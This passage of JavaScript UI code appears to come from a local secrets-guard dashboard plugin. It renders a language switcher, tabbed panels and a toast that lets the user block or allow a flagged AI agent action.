        // Language Switcher [ RU | EN ] in top right
        h("div", { className: "yg-lang-switch", role: "group", "aria-label": "Language" },
          h("button", {
            type: "button", className: "yg-lang-btn" + (lang === "ru" ? " on" : ""),
            onClick: function () { setLanguage("ru"); }
          }, "RU"),
          h("button", {
            type: "button", className: "yg-lang-btn" + (lang === "en" ? " on" : ""),
            onClick: function () { setLanguage("en"); }
          }, "EN")
        )
      ),

      // Tab Content View
      h("div", { className: "yg-grid" + (tab === "live" ? " live" : "") },
        tab === "live" ? h(LivePanel, {
          data: incidents,
          vault: vault,
          vaultCount: (vault && vault.items && vault.items.length) || 0,
          onChanged: refreshAll,
          refreshing: isRefreshing,
          guardMode: guardMode,
          pauseRemaining: pauseRemaining,
          onSetMode: changeGuardMode
        }) : null,
        tab === "exposure" ? h(ExposurePanel, null) : null,
        tab === "check" ? h(CheckPanel, null) : null,
        tab === "vault" ? h(VaultPanel, { vault: vault, onChanged: refresh }) : null,
        tab === "settings" ? h(SettingsPanel, null) : null
      ),

      // Toast for backgrounded Hermes notifications
      toast ? h(GuardToast, {
        inc: toast, count: pending, busy: toastBusy, note: toastNote,
        onDecide: decide, onDismiss: promote, onOpen: function () { setTab("live"); promote(); }
      }) : null,


      h("div", { className: "yg-foot" },
        "🔒 mcp-secrets-guard · " + T("Everything runs on this computer. Secrets are masked; the full value appears only while you hold 👁, and every view is logged."))
    );
  }

  function GuardToast(p) {
    const inc = p.inc;
    if (!inc) return null;
    return h("div", {
      className: "yg-card yg-toast",
      style: { position: "fixed", bottom: 20, right: 20, zIndex: 9999, minWidth: 320, maxWidth: 420, boxShadow: "0 10px 40px rgba(0,0,0,0.85)", borderColor: "var(--yg-bad)" }
    },
      h("div", { style: { display: "flex", alignItems: "center", gap: 8, marginBottom: 6 } },
        h("span", { style: { color: "var(--yg-bad)", fontWeight: 700 } }, "⛔ " + (currentLang === "ru" ? "Заблокировано действие агента" : "Agent Action Blocked")),
        h("button", { type: "button", className: "yg-btn ghost yg-right", onClick: p.onDismiss }, "✕")),
      h("div", { className: "yg-dim yg-small" }, (inc.tool || "") + " → " + (inc.destination || "")),
      h("div", { className: "yg-actions", style: { marginTop: 8 } },
        h("button", { className: "yg-btn bad", disabled: !!p.busy, onClick: function () { p.onDecide("block"); } }, currentLang === "ru" ? "Заблокировать" : "Block"),
        h("button", { className: "yg-btn ghost", disabled: !!p.busy, onClick: function () { p.onDecide("allow"); } }, currentLang === "ru" ? "Разрешить" : "Allow"),
        h("button", { className: "yg-btn ghost yg-right", onClick: p.onOpen }, currentLang === "ru" ? "В дашборд" : "Open Guard"))
    );
  }

  onReady(GuardPage);
})(window.__HERMES_PLUGIN_SDK__, function (GuardPage) {
  if (window.__HERMES_PLUGINS__ && typeof window.__HERMES_PLUGINS__.register === "function") {
    window.__HERMES_PLUGINS__.register("yadro-guard", GuardPage);
  }
});
